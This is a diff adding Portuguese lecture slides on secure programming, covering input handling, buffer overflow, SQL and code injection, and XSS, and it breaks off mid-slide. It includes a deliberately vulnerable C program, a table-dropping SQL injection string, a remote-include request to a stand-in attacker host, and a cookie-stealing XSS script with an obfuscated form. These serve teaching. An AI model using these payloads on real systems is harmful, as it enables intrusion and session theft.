@@ -57,24 +57,1017 @@
 
 \begin{frame}{Categoria de Erro de Software: Interação Insegura entre Componentes}
     \begin{itemize}
-        \item Neutralização Imprópria de Elementos Especiais usados em um Comando SQL (``Injeção de SQL'')
-        \item Neutralização Imprópria de Elementos Especiais usados em um Comando do SO (``Injeção de Comando do SO'')
-        \item Neutralização Imprópria de Entrada Durante a Geração de Página Web (``Cross-site Scripting'')
+        \item Neutralização Imprópria de Elementos Especiais usados em um Comando SQL (\textbf{Injeção de SQL})
+        \item Neutralização Imprópria de Elementos Especiais usados em um Comando do SO (\textbf{Injeção de Comando do SO})
+        \item Neutralização Imprópria de Entrada Durante a Geração de Página Web (\textbf{Cross-site Scripting})
         \item Upload Irrestrito de Arquivo com Tipo Perigoso
-        \item Falsificação de Solicitação entre Sites (CSRF)
-        \item Redirecionamento de URL para Site Não Confiável (``Redirecionamento Aberto'')
+        \item Falsificação de Solicitação entre Sites (\textbf{CSRF})
+        \item Redirecionamento de URL para Site Não Confiável (\textbf{Redirecionamento Aberto})
     \end{itemize}
 \end{frame}
 
 \begin{frame}{Categoria de Erro de Software: Gerenciamento de Recursos Arriscado}
     \begin{itemize}
-        \item Cópia de Buffer sem Verificar o Tamanho da Entrada (``Estouro de Buffer Clássico'')
-        \item Limitação Imprópria de um Nome de Caminho para um Diretório Restrito (``Path Traversal'')
+        \item Cópia de Buffer sem Verificar o Tamanho da Entrada (\textbf{Estouro de Buffer})
+        \item Limitação Imprópria de um Nome de Caminho para um Diretório Restrito (\textbf{Path Traversal})
         \item Download de Código Sem Verificação de Integridade
         \item Inclusão de Funcionalidade de Esfera de Controle Não Confiável
         \item Uso de Função Potencialmente Perigosa
         \item Cálculo Incorreto do Tamanho do Buffer
         \item String de Formatação Não Controlada
         \item Estouro de Inteiro ou \textit{Wraparound}
+    \end{itemize}
+\end{frame}
+
+\begin{frame}{Categoria de Erro de Software: Defesas Porosas}
+    \begin{itemize}
+        \item Falta de Autenticação para Função Crítica
+        \item Falta de Autorização
+        \item Uso de Credenciais Embutidas no Código (\textit{Hard-coded})
+        \item Falta de Criptografia de Dados Sensíveis
+        \item Dependência de Entradas Não Confiáveis em Decisão de Segurança
+        \item Execução com Privilégios Desnecessários
+        \item Autorização Incorreta
+        \item Atribuição Incorreta de Permissão para Recurso Crítico
+        \item Uso de Algoritmo Criptográfico Quebrado ou Arriscado
+        \item Restrição Imprópria de Tentativas Excessivas de Autenticação
+        \item Uso de Hash Unidirecional sem \textit{Salt}
+    \end{itemize}
+\end{frame}
+\begin{frame}{Falhas de Software e Qualidade}
+    \begin{itemize}
+        \item \textbf{Causas da Falha de um Programa:}
+              \begin{itemize}
+                  \item Resultado de alguma entrada teoricamente aleatória e não antecipada.
+                  \item Interação do sistema.
+                  \item Uso de código incorreto.
+              \end{itemize}
+
+        \item \textbf{Distribuição:}
+              \begin{itemize}
+                  \item Espera-se que essas falhas sigam alguma forma de distribuição de probabilidade.
+              \end{itemize}
+
+        \item \textbf{Abordagem Usual para Qualidade:}
+              \begin{itemize}
+                  \item Uso de projeto estruturado e testes.
+                  \item Objetivo: Identificar e eliminar tantos bugs quanto for razoavelmente possível.
+              \end{itemize}
+
+        \item \textbf{Metodologia de Teste:}
+              \begin{itemize}
+                  \item Envolve variações de entradas prováveis e erros comuns.
+                  \item Intenção: Minimizar o número de bugs que seriam vistos no uso geral.
+              \end{itemize}
+
+        \item \textbf{A Preocupação Principal:}
+              \begin{itemize}
+                  \item Não é o número total de bugs em um programa.
+                  \item Mas sim a frequência com que eles são acionados, resultando na falha do programa.
+              \end{itemize}
+    \end{itemize}
+\end{frame}
+
+\begin{frame}{Segurança de Software: A Abordagem Diferenciada}
+    \begin{itemize}
+        \item \textbf{A Escolha do Atacante:}
+              \begin{itemize}
+                  \item A segurança de software difere na medida em que o atacante escolhe a distribuição de probabilidade.
+                  \item O foco é atingir bugs específicos que resultam em uma falha que pode ser explorada.
+              \end{itemize}
+
+        \item \textbf{Entradas e Testes:}
+              \begin{itemize}
+                  \item Esses bugs podem ser frequentemente acionados por entradas que diferem drasticamente do que é usualmente esperado.
+                  \item Consequentemente, é improvável que sejam identificados por abordagens comuns de teste.
+              \end{itemize}
+
+        \item \textbf{Escrita de Código Seguro:}
+              \begin{itemize}
+                  \item Requer atenção a todos os aspectos de como um programa executa, o ambiente em que ele executa e o tipo de dados que processa.
+                  \item Nada pode ser assumido e todos os erros potenciais devem ser verificados.
+              \end{itemize}
+    \end{itemize}
+\end{frame}
+
+\begin{frame}{Definição de Programação Defensiva}
+    \begin{itemize}
+        \item \textbf{Definição:}
+              \begin{itemize}
+                  \item A Programação Defensiva (ou Segura) é o processo de projetar e implementar software de modo que ele continue a funcionar mesmo quando sob ataque.
+              \end{itemize}
+
+        \item \textbf{Comportamento do Software:}
+              \begin{itemize}
+                  \item O software escrito usando este processo é capaz de detectar condições errôneas resultantes de algum ataque.
+                  \item Ele deve ser capaz de continuar executando com segurança ou falhar de forma graciosa.
+              \end{itemize}
+
+        \item \textbf{A Regra Chave:}
+              \begin{itemize}
+                  \item Nunca assumir nada.
+                  \item Verificar todas as suposições.
+                  \item Tratar qualquer estado de erro possível.
+              \end{itemize}
+    \end{itemize}
+\end{frame}
+
+\begin{frame}{Modelo Abstrato e Suposições de Execução}
+    \begin{itemize}
+        \item \textbf{Explicitação de Suposições:}
+              \begin{itemize}
+                  \item A definição enfatiza a necessidade de tornar explícitas quaisquer suposições sobre como um programa será executado.
+                  \item Também é necessário explicitar os tipos de entrada que ele processará.
+              \end{itemize}
+
+        \item \textbf{Modelo Abstrato de um Programa:}
+              \begin{itemize}
+                  \item Ilustra conceitos ensinados na maioria dos cursos introdutórios de programação.
+                  \item O programa lê dados de entrada de uma variedade de fontes possíveis.
+                  \item Processa esses dados de acordo com algum algoritmo.
+                  \item Gera saída, possivelmente para múltiplos destinos diferentes.
+              \end{itemize}
+
+        \item \textbf{Ambiente e Interações:}
+              \begin{itemize}
+                  \item Executa no ambiente fornecido por algum sistema operacional, usando instruções de máquina de um processador específico.
+                  \item Durante o processamento, o programa usará chamadas de sistema (\textit{system calls}) e possivelmente outros programas disponíveis.
+              \end{itemize}
+
+        \item \textbf{Efeitos e Complexidade:}
+              \begin{itemize}
+                  \item A execução pode resultar em dados salvos ou modificados no sistema, ou causar outros efeitos colaterais.
+                  \item Todos esses aspectos podem interagir entre si, frequentemente de maneiras complexas.
+              \end{itemize}
+    \end{itemize}
+\end{frame}
+\begin{frame}{Foco do Desenvolvimento e Pressões de Negócio}
+    \begin{itemize}
+        \item \textbf{O Foco Típico do Programador:}
+              \begin{itemize}
+                  \item Foca no que é necessário para resolver o problema abordado pelo programa.
+                  \item A atenção está nos passos para o sucesso e no fluxo normal de execução.
+                  \item Frequentemente, não considera cada ponto potencial de falha.
+              \end{itemize}
+
+        \item \textbf{Suposições e Programação Defensiva:}
+              \begin{itemize}
+                  \item Programadores costumam fazer suposições sobre os tipos de entrada e o ambiente de execução.
+                  \item A programação defensiva exige que essas suposições sejam validadas pelo programa.
+                  \item Todas as falhas potenciais devem ser tratadas de forma graciosa e segura.
+              \end{itemize}
+
+        \item \textbf{Impacto e Conflito:}
+              \begin{itemize}
+                  \item Tratar erros corretamente aumenta a quantidade de código e o tempo de desenvolvimento.
+                  \item Isso conflita com pressões de negócio para manter tempos de desenvolvimento curtos e maximizar a vantagem de mercado.
+              \end{itemize}
+
+        \item \textbf{Conclusão:}
+              \begin{itemize}
+                  \item A menos que a segurança de software seja um objetivo de design desde o início, é improvável que resulte em um programa seguro.
+              \end{itemize}
+    \end{itemize}
+\end{frame}
+
+\begin{frame}{Alterações de Código e Manutenção}
+    \begin{itemize}
+        \item \textbf{O Foco na Mudança:}
+              \begin{itemize}
+                  \item Quando mudanças são necessárias, o programador geralmente foca no que precisa ser alcançado.
+              \end{itemize}
+
+        \item \textbf{Exigências da Programação Defensiva:}
+              \begin{itemize}
+                  \item Verificar cuidadosamente quaisquer suposições feitas.
+                  \item Verificar e tratar todos os erros possíveis.
+                  \item Checar cuidadosamente quaisquer interações com o código existente.
+              \end{itemize}
+
+        \item \textbf{Riscos da Falha no Gerenciamento:}
+              \begin{itemize}
+                  \item Pode resultar em comportamento incorreto do programa.
+                  \item Pode introduzir vulnerabilidades em um programa que era anteriormente seguro.
+              \end{itemize}
+    \end{itemize}
+\end{frame}
+
+\begin{frame}{A Mentalidade Defensiva (Mindset)}
+    \begin{itemize}
+        \item \textbf{Mudança de Paradigma:}
+              \begin{itemize}
+                  \item Requer uma mentalidade diferente das práticas tradicionais (que focam na "maioria dos usuários, na maioria das vezes").
+                  \item Necessária consciência das consequências da falha e das técnicas dos atacantes.
+                  \item "A paranoia é uma virtude": o crescimento de relatórios de vulnerabilidade comprova a ameaça.
+              \end{itemize}
+
+        \item \textbf{Limitações de Testes e Resiliência:}
+              \begin{itemize}
+                  \item Testes normais não identificam vulnerabilidades disparadas por entradas altamente incomuns.
+                  \item Lições devem ser aprendidas de falhas anteriores.
+                  \item Programas devem ser projetados para serem o mais resilientes possível diante de qualquer erro ou condição inesperada.
+              \end{itemize}
+    \end{itemize}
+\end{frame}
+
+\begin{frame}{Maturidade da Engenharia de Software e Segurança}
+    \begin{itemize}
+        \item \textbf{Comparação com outras Disciplinas:}
+              \begin{itemize}
+                  \item A necessidade de segurança e confiabilidade como objetivos de design é reconhecida há muito tempo na maioria das engenharias.
+                  \item A sociedade é intolerante a falhas catastróficas físicas (ex: queda de pontes, prédios ou aviões).
+              \end{itemize}
+
+        \item \textbf{A Realidade do Software:}
+              \begin{itemize}
+                  \item O desenvolvimento de software ainda não atingiu esse nível de maturidade.
+                  \item A sociedade tolera níveis de falha muito mais altos no software do que em outras disciplinas.
+              \end{itemize}
+    \end{itemize}
+\end{frame}
+
+\begin{frame}{Padrões e Esforços da Indústria}
+    \begin{itemize}
+        \item \textbf{Padrões de Qualidade:}
+              \begin{itemize}
+                  \item Existem esforços de engenharia e padrões de qualidade (ex: ISO 12207 - Processos de ciclo de vida de software, SEI06).
+                  \item Esses padrões identificam cada vez mais a segurança como um objetivo chave de design.
+              \end{itemize}
+
+        \item \textbf{Iniciativas Recentes (SAFECode):}
+              \begin{itemize}
+                  \item \textit{Software Assurance Forum for Excellence in Code}.
+                  \item Composto por grandes empresas da indústria de TI.
+                  \item Desenvolve publicações com melhores práticas para garantia de software e desenvolvimento seguro.
+              \end{itemize}
+    \end{itemize}
+\end{frame}
+
+\begin{frame}{Processo de Design e Modelagem de Ameaças}
+    \begin{itemize}
+        \item \textbf{Integração no Design:}
+              \begin{itemize}
+                  \item Recomenda-se incorporar a \textbf{Modelagem de Ameaças} (ou análise de risco) como parte do processo de design.
+              \end{itemize}
+
+        \item \textbf{Foco em Questões Específicas:}
+              \begin{itemize}
+                  \item O texto explora questões de segurança de software que devem ser incorporadas a uma metodologia de desenvolvimento mais ampla.
+              \end{itemize}
+    \end{itemize}
+\end{frame}
+
+\begin{frame}{Áreas Críticas de Interação do Programa}
+    \begin{itemize}
+        \item As preocupações de segurança são examinadas através das várias interações com um programa em execução:
+
+        \item \textbf{1. Tratamento Seguro de Entrada (Input Handling):} Questão crítica inicial.
+        \item \textbf{2. Implementação de Algoritmos:} Preocupações de segurança na lógica interna.
+        \item \textbf{3. Interação com Outros Componentes:} Comunicação com o sistema e outros softwares.
+        \item \textbf{4. Saída do Programa (Output):} Geração segura de resultados.
+
+        \item \textit{Nota:} Muitas vulnerabilidades resultam de um pequeno conjunto de erros comuns.
+    \end{itemize}
+\end{frame}
+
+\begin{frame}{Tratamento de Entrada de Programa}
+    \begin{itemize}
+        \item \textbf{A Falha Comum:}
+              \begin{itemize}
+                  \item O manuseio incorreto da entrada do programa é uma das falhas mais comuns na segurança de software.
+              \end{itemize}
+
+        \item \textbf{Definição de Entrada:}
+              \begin{itemize}
+                  \item Qualquer fonte de dados que se origina fora do programa.
+                  \item Cujo valor não é explicitamente conhecido pelo programador no momento da escrita do código.
+              \end{itemize}
+
+        \item \textbf{Fontes de Dados:}
+              \begin{itemize}
+                  \item \textit{Óbvias:} Teclado, mouse, arquivos, conexões de rede.
+                  \item \textit{Indiretas:} Ambiente de execução, arquivos de configuração, valores fornecidos pelo Sistema Operacional.
+              \end{itemize}
+    \end{itemize}
+\end{frame}
+
+\begin{frame}{Identificação e Verificação}
+    \begin{itemize}
+        \item \textbf{Requisitos de Segurança:}
+              \begin{itemize}
+                  \item Todas as fontes de entrada devem ser identificadas.
+                  \item Suposições sobre tamanho e tipo de valores devem ser levantadas.
+              \end{itemize}
+
+        \item \textbf{Validação:}
+              \begin{itemize}
+                  \item As suposições devem ser explicitamente verificadas pelo código do programa.
+                  \item Os valores devem ser usados de maneira consistente com essas suposições.
+              \end{itemize}
+
+        \item \textbf{Duas Áreas de Preocupação:}
+              \begin{itemize}
+                  \item 1. O tamanho da entrada.
+                  \item 2. O significado e interpretação da entrada.
+              \end{itemize}
+    \end{itemize}
+\end{frame}
+
+\begin{frame}{Tamanho da Entrada e Estouro de Buffer}
+    \begin{itemize}
+        \item \textbf{O Erro de Suposição:}
+              \begin{itemize}
+                  \item Programadores frequentemente assumem um tamanho máximo esperado (ex: entrada de texto de poucas linhas).
+                  \item Alocam buffers fixos (ex: 512 ou 1024 bytes) sem verificar se a entrada real cabe nesse espaço.
+              \end{itemize}
+
+        \item \textbf{Consequência (Buffer Overflow):}
+              \begin{itemize}
+                  \item Se a entrada excede o buffer, ocorre o estouro.
+                  \item Pode comprometer a execução do programa.
+              \end{itemize}
+
+        \item \textbf{Falha nos Testes:}
+              \begin{itemize}
+                  \item Testes comuns geralmente usam entradas "esperadas" e não identificam a vulnerabilidade.
+                  \item É improvável que incluam entradas grandes o suficiente para disparar o erro, a menos que testado explicitamente.
+              \end{itemize}
+    \end{itemize}
+\end{frame}
+
+\begin{frame}{Rotinas de Biblioteca e Prevenção}
+    \begin{itemize}
+        \item \textbf{Problema de Bibliotecas:}
+              \begin{itemize}
+                  \item Rotinas podem não limitar a quantidade de dados transferidos para o buffer.
+                  \item Isso agrava o problema de estouro de buffer.
+              \end{itemize}
+
+        \item \textbf{Práticas de Programação Segura:}
+              \begin{itemize}
+                  \item Uso de rotinas seguras de cópia de string e buffer.
+                  \item Conscientização dos programadores sobre essas armadilhas de segurança.
+              \end{itemize}
+    \end{itemize}
+\end{frame}
+
+\begin{frame}{Mentalidade de Codificação Segura}
+    \begin{itemize}
+        \item \textbf{A Regra de Ouro:}
+              \begin{itemize}
+                  \item Considerar qualquer entrada como perigosa.
+                  \item Processar de forma a não expor o programa ao perigo.
+              \end{itemize}
+
+        \item \textbf{Estratégias de Tamanho:}
+              \begin{itemize}
+                  \item Usar buffers de tamanho dinâmico (garantindo espaço suficiente).
+                  \item Processar a entrada em blocos do tamanho do buffer.
+              \end{itemize}
+
+        \item \textbf{Gerenciamento de Memória:}
+              \begin{itemize}
+                  \item Mesmo com buffers dinâmicos, garantir que o espaço solicitado não exceda a memória disponível.
+              \end{itemize}
+    \end{itemize}
+\end{frame}
+
+\begin{frame}{Tratamento de Erros}
+    \begin{itemize}
+        \item \textbf{Falha Graciosa:}
+              \begin{itemize}
+                  \item Se ocorrer erro de tamanho/memória, o programa deve lidar com a situação.
+                  \item Ações possíveis: Processar em blocos, descartar excesso, terminar o programa.
+              \end{itemize}
+
+        \item \textbf{Abrangência:}
+              \begin{itemize}
+                  \item Essas verificações devem ser aplicadas onde quer que dados de valor desconhecido entrem ou sejam manipulados.
+                  \item Devem ser aplicadas a todas as fontes potenciais de entrada.
+              \end{itemize}
+    \end{itemize}
+\end{frame}
+
+\begin{frame}[fragile]{Exemplo: Buffer Overflow na Stack}
+
+    \begin{verbatim}
+#include <stdio.h>
+#include <string.h>
+
+char *my_gets(char *s) {
+    int c;
+    char *p = s;
+
+    while ((c = getchar()) != '\n' && c != EOF) {
+        *p++ = c;
+    }
+    *p = '\0';
+    return s;
+}
+\end{verbatim}
+\end{frame}
+
+\begin{frame}[fragile]{Exemplo: Buffer Overflow na Stack (continuação)}
+
+    \begin{verbatim}
+void consulta_nome(char *s) { // Supor que venha um nome do banco
+    strcpy(s, "Gabriel");
+}
+int main() {
+    char var_outrasInfos[10];
+    char var_nome[10];
+
+    consulta_nome(var_nome);
+    my_gets(var_outrasInfos);   
+
+    printf("Dados: Nome: %s \nOutras Informacoes: %s \n", 
+    var_nome, var_outrasInfos);
+
+    printf("==Fim do Programa==\n");
+    return 0;
+}
+\end{verbatim}
+\end{frame}
+
+\begin{frame}[fragile]{Compilando e Executando}
+    \begin{itemize}
+        \item \textbf{1. Compilação:}
+              Utilize o GCC para transformar o código fonte em executável.
+    \end{itemize}
+
+    \begin{verbatim}
+gcc -o buffer_overlflow buffer_overlflow.c
+    \end{verbatim}
+
+
+
+    \begin{itemize}
+        \item \textbf{2. Execução:}
+              Rode o programa gerado.
+    \end{itemize}
+
+    \begin{verbatim}
+./buffer_overlflow
+    \end{verbatim}
+
+
+
+    \textbf{Para testar a vulnerabilidade:}
+    \begin{enumerate}
+        \item Tente digitar algo curto (ex: "Teste"). O programa funcionará normalmente.
+        \item Execute novamente e digite mais de 10 caracteres (ex: "1234567890AAAAA").
+        \item Observe que a variável \texttt{var\_nome} ("Gabriel") será sobrescrita pelos caracteres excedentes.
+    \end{enumerate}
+\end{frame}
+
+\begin{frame}[fragile]{Saída do Programa (Demonstração da Vulnerabilidade)}
+
+    \begin{verbatim}
+$ ./buffer_overlflow
+jewrhoewhouwehouewhurhwerhuwehriuwheirhiwphrpiuwhiurhwhrwhir
+hwphrwhuirhweiwehriwiuerhiwehriwherre
+
+Dados:  Nome: uwehouewhurhwerhuwehriuwheirhiwphrpiuwhiurhwhrwhirhwphrwhuir
+hweiwehriwiuerhiwehriwherre  
+Outras Informacoes: jewrhoewhouwehouewhurhwerhuwehriuwheirhiwphrpiuwhiurhwhrwhirhwphrwhu
+irhweiwehriwiuerhiwehriwherre  
+
+==Fim do Programa==
+*** stack smashing detected ***: terminated
+fish: Job 1, './buffer_overlflow' terminated by signal SIGABRT (Abort)
+    \end{verbatim}
+
+    \textbf{Observação:} A mensagem \texttt{stack smashing detected} indica que o GCC  inseriu proteções que detectaram a corrupção da pilha ao tentar retornar da função.
+\end{frame}
+
+\begin{frame}[fragile]{Desabilitando a proteção na compilação}
+    \begin{itemize}
+        \item O erro \textit{"stack smashing detected"} ocorre porque compiladores modernos (GCC) inserem proteções por padrão.
+        \item Para reproduzir o ataque clássico, usamos a flag \texttt{-fno-stack-protector}.
+    \end{itemize}
+
+    \begin{verbatim}
+# Compilando sem protecao de stack
+gcc -fno-stack-protector -o buffer_overlflow buffer_overflow.c
+
+# Executando
+./buffer_overlflow
+
+#Veja a saída e procure em 
+$man 7 signal
+    \end{verbatim}
+\end{frame}
+
+\begin{frame}{Interpretação da Entrada do Programa}
+    \begin{itemize}
+        \item \textbf{Preocupação Chave:}
+              \begin{itemize}
+                  \item O significado e a interpretação da entrada são tão críticos quanto o tamanho.
+                  \item Classificação geral: Dados textuais ou binários.
+              \end{itemize}
+
+        \item \textbf{Processamento de Dados Binários:}
+              \begin{itemize}
+                  \item O programa assume que valores binários brutos representam inteiros, \textit{floats}, strings ou estruturas complexas.
+                  \item A interpretação assumida deve ser validada conforme os valores são lidos.
+              \end{itemize}
+
+        \item \textbf{Exemplos em Protocolos:}
+              \begin{itemize}
+                  \item Baixo nível: Frames Ethernet, pacotes IP, segmentos TCP.
+                  \item Alto nível: DNS, SNMP, NFS (codificação binária de requisições/respostas).
+                  \item Exigem validação contra especificações de sintaxe abstrata.
+              \end{itemize}
+    \end{itemize}
+\end{frame}
+
+\begin{frame}{Exemplo de Falha: Heartbleed}
+    \begin{itemize}
+        \item \textbf{O Caso:}
+              \begin{itemize}
+                  \item Bug Heartbleed no OpenSSL (2014).
+                  \item Exemplo de falha na verificação da validade de um valor de entrada binário.
+              \end{itemize}
+
+        \item \textbf{O Erro Técnico:}
+              \begin{itemize}
+                  \item Erro de codificação: Falha ao verificar a quantidade de dados solicitada para retorno contra a quantidade fornecida.
+                  \item Classificado como \textit{buffer over-read} (leitura excessiva de buffer).
+              \end{itemize}
+
+        \item \textbf{Impacto:}
+              \begin{itemize}
+                  \item Atacantes puderam acessar o conteúdo da memória adjacente.
+                  \item Vazamento de nomes de usuário, senhas, chaves privadas e outras informações sensíveis.
+              \end{itemize}
+    \end{itemize}
+\end{frame}
+\begin{frame}{Processamento de Dados Textuais e Codificação}
+    \begin{itemize}
+        \item \textbf{Interpretação de Caracteres:}
+              \begin{itemize}
+                  \item Valores binários brutos são interpretados como caracteres segundo um conjunto de caracteres (\textit{character set}).
+              \end{itemize}
+
+        \item \textbf{Conjuntos de Caracteres:}
+              \begin{itemize}
+                  \item Tradicionalmente: ASCII.
+                  \item Sistemas comuns (Windows/MacOS): Extensões diferentes para caracteres acentuados.
+                  \item Cenário atual: Internacionalização crescente e variedade de conjuntos de caracteres.
+              \end{itemize}
+
+        \item \textbf{Requisito:}
+              \begin{itemize}
+                  \item Cuidado necessário para identificar qual conjunto está sendo usado e quais caracteres estão sendo lidos.
+              \end{itemize}
+    \end{itemize}
+\end{frame}
+\begin{frame}{Identificação e Validação de Significado}
+    \begin{itemize}
+        \item \textbf{Identificação do Conteúdo:}
+              \begin{itemize}
+                  \item Além dos caracteres, o significado deve ser identificado (ex: inteiro, \textit{float}, nome de arquivo, URL, e-mail).
+              \end{itemize}
+
+        \item \textbf{Confirmação de Tipo:}
+              \begin{itemize}
+                  \item Dependendo do uso, é necessário confirmar se os valores representam o tipo de dado esperado.
+              \end{itemize}
+
+        \item \textbf{Consequências da Falha:}
+              \begin{itemize}
+                  \item Pode resultar em vulnerabilidades.
+                  \item Permite que um atacante influencie a operação do programa, com consequências possivelmente sérias.
+              \end{itemize}
+    \end{itemize}
+\end{frame}
+\begin{frame}{Problemas de Interpretação e Injeção}
+    \begin{itemize}
+        \item \textbf{Classe de Ataques:}
+              \begin{itemize}
+                  \item Ataques de injeção (\textit{injection attacks}) exploram a falha na validação da interpretação da entrada.
+              \end{itemize}
+
+        \item \textbf{Mecanismos de Defesa:}
+              \begin{itemize}
+                  \item Validação de dados de entrada.
+                  \item Tratamento correto de entradas internacionalizadas usando diversos conjuntos de caracteres.
+              \end{itemize}
+    \end{itemize}
+\end{frame}
+
+\begin{frame}{Interpretação de Entrada: Problemas de Serialização}
+    \begin{itemize}
+        \item \textbf{O que é Serialização/Desserialização?}
+              \begin{itemize}
+                  \item Processo de converter objetos em um fluxo de bytes (para armazenamento ou transmissão) e reconstruí-los depois.
+                  \item É uma forma complexa de interpretação de entrada binária.
+              \end{itemize}
+
+        \item \textbf{A Vulnerabilidade (Insecure Deserialization):}
+              \begin{itemize}
+                  \item Ocorre quando a aplicação aceita objetos serializados de fontes não confiáveis.
+                  \item O programa assume que o fluxo de bytes representa um objeto válido e seguro.
+              \end{itemize}
+
+        \item \textbf{O Ataque:}
+              \begin{itemize}
+                  \item O atacante manipula o fluxo de bytes (input).
+                  \item Durante a reconstrução (interpretação), o sistema é forçado a executar a lógica do atacante.
+                  \item Frequentemente resulta em Execução Remota de Código (\textbf{RCE}).
+              \end{itemize}
+        \item \href{http://www.repositorio.poli.ufrj.br/monografias/projpoli10048122.pdf}{\textcolor{blue}{Veja o seguinte TCC da UFRJ}}
+    \end{itemize}
+\end{frame}
+
+\begin{frame}{Ataques de Injeção}
+    \begin{itemize}
+        \item \textbf{Definição:} Refere-se a uma ampla variedade de falhas de programa relacionadas ao manuseio inválido de dados de entrada.
+        \item \textbf{Problema Central:} Ocorre quando dados de entrada influenciam, acidental ou deliberadamente, o fluxo de execução do programa.
+        \item \textbf{Mecanismo Comum:} Dados de entrada são passados como parâmetros para um programa auxiliar no sistema, cuja saída é usada pelo programa original.
+        \item \textbf{Contexto de Desenvolvimento:} Ocorre frequentemente em linguagens de script (Perl, PHP, Python, sh) que encorajam o reuso de utilitários do sistema para economizar esforço de codificação.
+        \item \textbf{Uso Típico:} Comumente observados em scripts Web CGI utilizados para processar dados fornecidos por formulários HTML.
+    \end{itemize}
+\end{frame}
+
+\begin{frame}[fragile]{Injeção de SQL (SQL Injection)}
+    \begin{itemize}
+        \item \textbf{Conceito:} Ataque onde a entrada fornecida pelo usuário é usada para construir uma requisição SQL e recuperar informações de um banco de dados.
+        \item \textbf{Exemplo de Código Vulnerável (PHP):}
+              \begin{verbatim}
+$name = $_REQUEST['name'];
+$query = "SELECT * FROM suppliers WHERE name = '" . $name . "';";
+$result = mysql_query($query);
+        \end{verbatim}
+        \item \textbf{Vulnerabilidade:} Similar à injeção de comando, mas utiliza metacaracteres SQL.
+        \item \textbf{Cenário de Exemplo:}
+              \begin{itemize}
+                  \item Entrada ``\textbf{Bob}'': O código funciona como pretendido.
+                  \item Entrada ``\textbf{Bob'; drop table suppliers}'': Recupera o registro e deleta a tabela inteira.
+              \end{itemize}
+        \item \textbf{Prevenção e Mitigação:}
+              \begin{itemize}
+                  \item Validar a entrada antes do uso (escapar metacaracteres ou rejeitar).
+                  \item Usar funções da linguagem para sanitizar a entrada.
+                  \item Utilizar \textit{placeholders} ou parâmetros SQL em vez de concatenar valores.
+                  \item Uso combinado com procedimentos armazenados (\textit{stored procedures}).
+              \end{itemize}
+    \end{itemize}
+\end{frame}
+
+\begin{frame}[fragile]{Ataque de Injeção de Código (Code Injection)}
+    \begin{itemize}
+        \item \textbf{Definição:} Tipo de ataque onde a entrada inclui código que é posteriormente executado pelo sistema atacado.
+        \item \textbf{Cenário (PHP):} Uso de variáveis para construir nomes de arquivos em scripts de inclusão.
+              \begin{verbatim}
+include $path . 'functions.php';
+include $path . 'data/prefs.php';
+        \end{verbatim}
+        \item \textbf{Mecanismo da Falha:}
+              \begin{itemize}
+                  \item O script é chamado diretamente (burlando a intenção original).
+                  \item Exploração de funcionalidades do PHP: atribuição de variáveis globais via requisição HTTP e comando \texttt{include} aceitando URLs remotas.
+              \end{itemize}
+        \item \textbf{Exemplo de Ataque (Remote Code Injection):}
+              \begin{verbatim}
+GET /calendar/embed/day.php?path=http://hacker.site/hack.txt?&cmd=ls
+        \end{verbatim}
+        \item \textbf{Resultado:} A variável \texttt{\$path} recebe a URL do atacante, e o código contido no arquivo remoto é executado com os privilégios do servidor Web.
+    \end{itemize}
+\end{frame}
+
+\begin{frame}{Defesas contra Ataques de Injeção}
+    \begin{itemize}
+        \item \textbf{Bloqueio de Variáveis Globais:}
+              \begin{itemize}
+                  \item Bloquear a atribuição automática de valores de campos de formulário para variáveis globais.
+                  \item Salvar valores em um array e recuperá-los explicitamente pelo nome (padrão em instalações PHP mais novas).
+                  \item \textit{Desvantagem:} Pode quebrar códigos legados, exigindo esforço de correção.
+                  \item \textit{Vantagem:} Previne injeção de código e manipulação indevida de variáveis globais.
+              \end{itemize}
+
+        \item \textbf{Controle de Comandos de Inclusão:}
+              \begin{itemize}
+                  \item Utilizar apenas valores constantes em comandos \texttt{include} e \texttt{require}.
+                  \item Caso o uso de variáveis seja necessário, validar rigorosamente seu valor imediatamente antes do uso.
+              \end{itemize}
+
+        \item \textbf{Variantes e Prevenção Geral:}
+              \begin{itemize}
+                  \item Existem outras variantes como injeção de e-mail, \textit{format string} e injeção de interpretador.
+                  \item \textbf{Necessidade Crítica:} Identificar todas as fontes de entrada, validar suposições antes do uso e compreender a interpretação dos valores passados para qualquer função ou serviço invocado.
+              \end{itemize}
+    \end{itemize}
+\end{frame}
+
+
+\begin{frame}[fragile]{Exemplo de Ataque XSS e Ofuscação}
+    \begin{itemize}
+        \item \textbf{Cenário (Roubo de Cookie):} Código injetado em um livro de visitas que envia o cookie da vítima para o atacante, permitindo personificação.
+              \begin{verbatim}
+Thanks for this information, its great!
+<script>document.location='http://hacker.web.site/cookie.cgi?'+
+document.cookie</script>
+        \end{verbatim}
+
+        \item \textbf{Ofuscação (Evasão):} O atacante utiliza entidades de caracteres HTML para esconder o script. O navegador interpreta o código abaixo de forma idêntica ao original.
+              \begin{verbatim}
+Thanks for this information, its great!
+&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;
+&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116; ...
+        \end{verbatim}
+    \end{itemize}
+\end{frame}
+
+\begin{frame}{XSS: Prevenção e Causa Raiz}
+    \begin{itemize}
+        \item \textbf{Prevenção:}
+              \begin{itemize}
+                  \item Examinar entradas fornecidas pelo usuário.
+                  \item Remover ou escapar (\textit{escape}) códigos perigosos.
+                  \item Validadores devem traduzir entidades HTML antes da verificação.
+              \end{itemize}
+
+        \item \textbf{Natureza da Falha:}
+              \begin{itemize}
+                  \item Representa uma falha no manuseio tanto da \textbf{entrada} quanto da \textbf{saída} do programa.
+                  \item O alvo real é o \textbf{usuário} subsequente, não o servidor.
+                  \item A sanitização da saída impede a ocorrência do ataque.
+              \end{itemize}
+
+        \item \textbf{Contexto:} Problema similar ao CSRF e \textit{HTTP response splitting} (uso descuidado de entrada não confiável).
+    \end{itemize}
+\end{frame}
+
+\begin{frame}{Validação de Sintaxe de Entrada}
+    \begin{itemize}
+        \item \textbf{Suposições sobre Dados:}
+              \begin{itemize}
+                  \item O programador deve garantir que os dados conformem com as suposições (caracteres imprimíveis, formato de e-mail, inteiros, etc.) antes do uso.
+              \end{itemize}
+
+        \item \textbf{Estratégias de Validação:}
+              \begin{itemize}
+                  \item \textbf{Whitelisting (Recomendado):} Comparar a entrada com o que é desejado e aceitar apenas o válido.
+                  \item \textbf{Blacklisting (Problemático):} Comparar com valores perigosos conhecidos. Falha quando novos métodos de evasão são descobertos.
+              \end{itemize}
+
+        \item \textbf{Implementação:}
+              \begin{itemize}
+                  \item Frequentemente feita via Expressões Regulares (\textit{Regular Expressions}).
